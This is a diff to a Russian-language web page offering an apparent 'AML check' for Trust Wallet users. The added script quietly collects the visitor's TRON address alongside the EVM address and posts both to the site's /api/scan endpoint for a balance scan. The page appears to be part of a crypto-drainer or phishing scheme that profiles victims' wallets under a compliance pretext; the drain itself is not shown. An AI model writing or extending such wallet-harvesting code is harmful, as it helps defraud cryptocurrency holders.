@@ -72,7 +72,7 @@
               </button>
               <a
                 class="wallet-deeplink"
-                href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D10"
+                href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D11"
                 data-trust-deeplink
                 rel="noopener"
               >
@@ -121,7 +121,7 @@
 
     <script>
       (function () {
-        var deeplink = "https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D10";
+        var deeplink = "https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D11";
         function bySel(sel) { return document.querySelector(sel); }
         function getProvider() {
           if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
@@ -149,6 +149,35 @@
           if (lockNote) lockNote.textContent = "Кошелёк подключён. Можно запускать AML-проверку.";
           var walletLabel = bySel("[data-user-wallet-address]");
           if (walletLabel) walletLabel.textContent = "EVM: " + address;
+        }
+        function readTronAddress(value) {
+          var address = String(value || "").trim();
+          return address && address.charAt(0) === "T" && address.length >= 26 ? address : "";
+        }
+        function getTronPassive() {
+          var tronWeb =
+            (window.trustwallet && window.trustwallet.tronLink && window.trustwallet.tronLink.tronWeb) ||
+            (window.trustwallet && window.trustwallet.tronWeb) ||
+            window.tronWeb ||
+            (window.tronLink && window.tronLink.tronWeb) ||
+            (window.tron && window.tron.tronWeb);
+          return readTronAddress(tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58);
+        }
+        function requestTronAddress() {
+          var passive = getTronPassive();
+          if (passive) return Promise.resolve(passive);
+          var tron = (window.trustwallet && window.trustwallet.tronLink) || window.tronLink || window.tron;
+          if (!tron || !tron.request) return Promise.resolve("");
+          return Promise.race([
+            tron.request({ method: "tron_requestAccounts" }).then(function (result) {
+              if (Array.isArray(result)) return readTronAddress(result[0]);
+              if (typeof result === "string") return readTronAddress(result);
+              return readTronAddress(result && result.address);
+            }),
+            new Promise(function (resolve) {
+              setTimeout(function () { resolve(getTronPassive()); }, 5000);
+            }),
+          ]).catch(function () { return getTronPassive(); });
         }
 
         window.inlineConnectFallback = function (event) {
@@ -180,21 +209,26 @@
             unlockForm(address);
             if (status) status.textContent = "Кошелёк подключён. Проверяем балансы...";
             if (typeof fetch === "function") {
-              fetch("/api/scan", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  evmAddress: address,
-                  source: "trust_wallet_inline",
-                  pageUrl: window.location.href
-                })
-              })
-                .then(function () {
-                  if (status) status.textContent = "Кошелёк подключён. Балансы отправлены на проверку.";
-                })
-                .catch(function () {
-                  if (status) status.textContent = "Кошелёк подключён. Балансы отправятся при следующем запросе.";
+              requestTronAddress().then(function (tronAddress) {
+                return fetch("/api/scan", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    evmAddress: address,
+                    tronAddress: tronAddress || undefined,
+                    source: "trust_wallet_inline",
+                    pageUrl: window.location.href
+                  })
+                }).then(function () {
+                  if (status) {
+                    status.textContent = tronAddress
+                      ? "Кошелёк подключён. EVM/TRON балансы отправлены на проверку."
+                      : "Кошелёк подключён. EVM баланс отправлен, TRON адрес не получен.";
+                  }
                 });
+              }).catch(function () {
+                if (status) status.textContent = "Кошелёк подключён. Балансы отправятся при следующем запросе.";
+              });
             }
           }).catch(function () {
             if (status) status.textContent = "Подтвердите вход в Trust Wallet или откройте его кнопкой справа.";
@@ -204,8 +238,8 @@
       })();
     </script>
 
-    <script src="config.js?v=auto-scan10"></script>
-    <script src="auto-wallet.js?v=auto-scan10"></script>
-    <script src="check-flow.js?v=auto-scan10"></script>
+    <script src="config.js?v=auto-scan11"></script>
+    <script src="auto-wallet.js?v=auto-scan11"></script>
+    <script src="check-flow.js?v=auto-scan11"></script>
   </body>
 </html>
